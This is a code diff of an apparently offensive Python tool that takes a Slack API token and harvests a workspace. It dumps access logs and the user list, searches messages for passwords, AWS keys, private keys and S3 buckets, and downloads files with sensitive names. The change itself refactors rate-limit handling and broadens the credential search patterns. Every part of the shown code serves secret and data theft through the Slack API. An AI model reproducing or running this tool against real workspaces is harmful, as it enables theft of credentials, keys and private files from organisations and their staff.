@@ -38,23 +38,30 @@ file_s3 = "s3.txt"
 file_credentials = "credentials.txt"
 file_aws = "aws-keys.txt"
 file_private_keys = "private-keys.txt"
-tier_2_rate_limit_counter = 1  # keeping track of number of requests so that we rate-limit before Slack does it for us
 
 s3_queries = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
-credentials_queries = ["password:", "password is"]
+credentials_queries = ["password:", "password is", "pwd", "passwd"]
 aws_keys_queries = ["ASIA", "AKIA"]
 private_keys_queries = ["BEGIN RSA PRIVATE", "BEGIN OPENSSH PRIVATE", "BEGIN DSA PRIVATE", "BEGIN EC PRIVATE",
                         "BEGIN PGP PRIVATE"]
-interesting_files_queries = [".KEY", ".PEM", ".PPK", ".XLS", ".XLSX", ".DOC", ".DOCX", ".SH", ".SQL", "password",
-                             "secret"]
+interesting_files_queries = [".key", ".pem", ".ppk", ".pkcs12", ".pfx", ".p12", ".doc", ".docx",
+                             ".sh", ".sql", "password", "secret", "backup"]
 
 already_signed_in_team_regex = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"  # https://regex101.com/r/9GRaem/1
 slack_api_token_regex = r"api_token: \"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""  # https://regex101.com/r/2Hz8AX/1
 workspace_valid_emails_regex = r"email-domains-formatted=\"(@.+?)[\"]"  # https://regex101.com/r/cSZW0G/1
 private_keys_regex = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"  # https://regex101.com/r/jWrF8F/2
 s3_regex = r"([a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9-\.\_]+|s3-[a-zA-Z0-9-\.\_\/]+|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"  # https://regex101.com/r/6bLaKj/8
-credentials_regex = r"[pP]assword\s*:\s*[^\s]+|password is\s*:\s*[^\s]+|password is\s*\"[^\s]+"  # https://regex101.com/r/xQz9JT/3
+credentials_regex = r"(?i)(password\s*[`=:\"]+\s*[^\s]+|password is\s*[`=:\"]+\s*[^\s]+|pwd\s*[`=:\"]+\s*[^\s]+|passwd\s*[`=:\"]+\s*[^\s]+)"  # https://regex101.com/r/DoPV1M/1
 aws_keys_regex = r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])"  # https://regex101.com/r/IEq5nU/2
+
+
+def is_rate_limited(r):
+    if r['ok'] is False and r['error'] == 'ratelimited':
+        print(termcolor.colored("INFO: Slack API rate limit hit - sleeping for 60 seconds", "blue"))
+        time.sleep(60)
+    else:
+        return
 
 
 def is_cookie_flag_set():
@@ -88,13 +95,12 @@ def check_token_validity():
         if str(r['ok']) == 'True':
             output_directory = str(r['team'])
             slack_workspace = str(r['url'])
-            print(termcolor.colored("Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']), "blue"))
+            print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']), "blue"))
             print(termcolor.colored("\n"))
             pathlib.Path(output_directory).mkdir(parents=True,
                                                  exist_ok=True)  # create files directory to keep things tidy
         else:
-            print(termcolor.colored("Token not valid. Slack error: " + str(r['error']), "red"))
-            print(termcolor.colored("\n"))
+            print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "red"))
             exit()
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
@@ -105,11 +111,10 @@ def print_interesting_information():
         r = requests.get(slack_workspace)
         team_domains_match = re.findall(workspace_valid_emails_regex, str(r.content))
         for domain in team_domains_match:
-            print(termcolor.colored("The following domains can be used on this Slack Workspace: " + domain, "blue"))
+            print(termcolor.colored("INFO: The following domains can be used on this Slack Workspace: " + domain, "blue"))
             print(termcolor.colored("\n"))
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-        print(termcolor.colored("\n"))
 
 
 def dump_team_access_logs():
@@ -117,6 +122,7 @@ def dump_team_access_logs():
     try:
         r = requests.get(
             "https://slack.com/api/team.accessLogs?token=" + token + "&pretty=1&count=1000").json()
+        is_rate_limited(r)
         if str(r['ok']) == 'True':
             for value in r['logins']:
                 with open(output_directory + '/' + file_access_logs, 'a') as outfile:
@@ -127,8 +133,7 @@ def dump_team_access_logs():
             return
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-    print(termcolor.colored("END: Successfully dumped access logs! Filename: ./" + output_directory + "/" + file_access_logs,
-                            "green"))
+    print(termcolor.colored("END: Successfully dumped access logs! Filename: ./" + output_directory + "/" + file_access_logs, "green"))
     print(termcolor.colored("\n"))
 
 
@@ -138,6 +143,7 @@ def dump_user_list():
     try:
         r = requests.get(
             "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=1&cursor=" + pagination_cursor).json()
+        is_rate_limited(r)
         if str(r['ok']) == 'False':
             print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']), "yellow"))
             print(termcolor.colored("\n"))
@@ -152,64 +158,54 @@ def dump_user_list():
                         json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=True)
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-        print(termcolor.colored("\n"))
-    print(termcolor.colored("END: Successfully dumped user list! Filename: ./" + output_directory + "/" + file_user_list,
-                            "green"))
+    print(termcolor.colored("END: Successfully dumped user list! Filename: ./" + output_directory + "/" + file_user_list, "green"))
     print(termcolor.colored("\n"))
 
 
 def find_s3():
     print(termcolor.colored("START: Attempting to find references of S3 buckets", "blue"))
-    global tier_2_rate_limit_counter
     pagination = {}
 
     try:
         for query in s3_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
+            is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
-                    print(
-                        termcolor.colored("INFO: Sleeping for 60 seconds so we don't hit the Slack API rate limit!", "blue"))
-                    time.sleep(60)
+                is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(page)).json()
                 regex_results = re.findall(s3_regex, str(r))
                 with open(output_directory + '/' + file_s3, 'a') as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
-                tier_2_rate_limit_counter += 1
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
         print(termcolor.colored("\n"))
-    print(termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + output_directory + "/" + file_s3,
-                            "green"))
+    print(termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + output_directory + "/" + file_s3, "green"))
     print(termcolor.colored("\n"))
 
 
 def find_credentials():
     print(termcolor.colored("START: Attempting to find references to credentials", "blue"))
-    global tier_2_rate_limit_counter
     pagination = {}
 
     try:
         for query in credentials_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
+            is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
-                    print(
-                        termcolor.colored("INFO: Sleeping for 60 seconds so we don't hit the Slack API rate limit!", "blue"))
-                    time.sleep(60)
+                is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                         page)).json()
@@ -217,11 +213,9 @@ def find_credentials():
                 with open(output_directory + '/' + file_credentials, 'a') as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
-                tier_2_rate_limit_counter += 1
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-        print(termcolor.colored("\n"))
     print(termcolor.colored(
         "END: If any credentials were found, they will be here: ./" + output_directory + "/" + file_credentials, "green"))
     print(termcolor.colored("\n"))
@@ -229,23 +223,19 @@ def find_credentials():
 
 def find_aws_keys():
     print(termcolor.colored("START: Attempting to find references to AWS keys", "blue"))
-    global tier_2_rate_limit_counter
     pagination = {}
 
     try:
         for query in aws_keys_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
+            is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
-                    print(
-                        termcolor.colored("INFO: Sleeping for 60 seconds so we don't hit the Slack API rate limit!", "blue"))
-                    print(termcolor.colored("\n"))
-                    time.sleep(60)
+                is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                         page)).json()
@@ -253,34 +243,28 @@ def find_aws_keys():
                 with open(output_directory + '/' + file_aws, 'a') as log_output:
                     for item in set(regex_results):
                         log_output.write(item + "\n")
-                tier_2_rate_limit_counter += 1
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-        print(termcolor.colored("\n"))
-    print(termcolor.colored("END: If any AWS keys were found, they will be here: ./" + output_directory + "/" + file_aws,
-                            "green"))
+    print(termcolor.colored("END: If any AWS keys were found, they will be here: ./" + output_directory + "/" + file_aws, "green"))
     print(termcolor.colored("\n"))
 
 
 def find_private_keys():
     print(termcolor.colored("START: Attempting to find references to private keys", "blue"))
-    global tier_2_rate_limit_counter
     pagination = {}
 
     try:
         for query in private_keys_queries:
             r = requests.get(
                 "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
+            is_rate_limited(r)
             pagination[query] = (r['messages']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
-                    print(
-                        termcolor.colored("INFO: Sleeping for 60 seconds so we don't hit the Slack API rate limit!", "blue"))
-                    time.sleep(60)
+                is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                         page)).json()
@@ -289,11 +273,9 @@ def find_private_keys():
                 with open(output_directory + '/' + file_private_keys, 'a') as log_output:
                     for item in set(remove_new_line_char):
                         log_output.write(item + "\n\n")
-                tier_2_rate_limit_counter += 1
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-        print(termcolor.colored("\n"))
     print(termcolor.colored(
         "END: If any private keys were found, they will be here: ./" + output_directory + "/" + file_private_keys, "green"))
     print(termcolor.colored("\n"))
@@ -305,22 +287,19 @@ def download_interesting_files():
                                                         exist_ok=True)  # create files directory to keep things tidy
     bad_characters = "/\\:*?\"<>|"  # Windows doesn't like these characters. Guess how I found out.
     strip_bad_characters = str.maketrans(bad_characters, '_________')  # Replace bad characters with an underscore
-    global tier_2_rate_limit_counter
     pagination = {}
 
     try:
         for query in interesting_files_queries:
             r = requests.get(
                 "https://slack.com/api/search.files?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
+            is_rate_limited(r)
             pagination[query] = (r['files']['pagination']['page_count'])
 
         for key, value in pagination.items():
             page = 1
             while page <= value:
-                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
-                    print(
-                        termcolor.colored("INFO: Sleeping for 60 seconds so we don't hit the Slack API rate limit!", "blue"))
-                    time.sleep(60)
+                is_rate_limited(r)
                 r = requests.get(
                     "https://slack.com/api/search.files?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(page)).json()
                 for file in r['files']['matches']:
@@ -328,11 +307,9 @@ def download_interesting_files():
                     r = requests.get(file['url_private'], headers={'Authorization': 'Bearer ' + token})
                     open(output_directory + '/downloads/' + str(random.randint(0, 999)) + ' ' + file_name.translate(
                         strip_bad_characters), 'wb').write(r.content)
-                tier_2_rate_limit_counter += 1
                 page += 1
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "red"))
-        print(termcolor.colored("\n"))
     print(
         termcolor.colored("END: Downloaded files (if any were found) will be found in: ./" + output_directory + "/downloads",
                           "green"))
